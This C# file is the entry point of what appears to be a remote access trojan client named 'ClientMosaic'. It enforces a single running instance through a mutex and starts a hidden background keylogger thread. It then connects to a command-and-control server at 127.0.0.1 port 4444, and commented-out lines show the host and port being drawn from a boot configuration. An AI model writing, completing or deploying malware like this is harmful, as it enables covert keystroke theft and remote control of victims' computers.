using Client.Controllers;
using Client.Controllers.Tools;
using Client.Models;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Client
{
    static class Program
    {

        public static ClientMosaic client;
        public static Boot bootController;
        private static ApplicationContext _msgLoop;

        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            bool result;

            //bootController = new BootController();
            //StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
            //MutexController.mutexKey = BootController.getMutexKey(readerMutex);
            MutexController.mutexKey = "sdkfjslkfjsldkfjsdlfj546s46s46s64s";
            result = MutexController.createMutex();
            //var mutex = new System.Threading.Mutex(true, mutexKey, out result);

            if (!result)
            {
                MessageBox.Show("Another instance of application is already running !");
                return;
            }
            MessageBox.Show(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Settings.LOGDIRECTORYNAME));

            if (Settings.ENABLELOGGER)
            {
                new Thread(() =>
                {
                    _msgLoop = new ApplicationContext();
                    Keylogger logger = new Keylogger(15000);
                    Application.Run(_msgLoop);
                }){ IsBackground = true }.Start();
            }

            ClientData.installPath = Path.Combine(AuthenticationController.DIRECTORY, ((!string.IsNullOrEmpty(AuthenticationController.SUBDIRECTORY)) ? AuthenticationController.SUBDIRECTORY + @"\" : "") + AuthenticationController.INSTALLNAME);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            client = new ClientMosaic("127.0.0.1", 4444);
            //ClientMosaic.testexit = false;
            //client = new ClientMosaic(bootController.host, bootController.port);
            client.connect();
            //GC.KeepAlive(mutex);
        }
    }
}
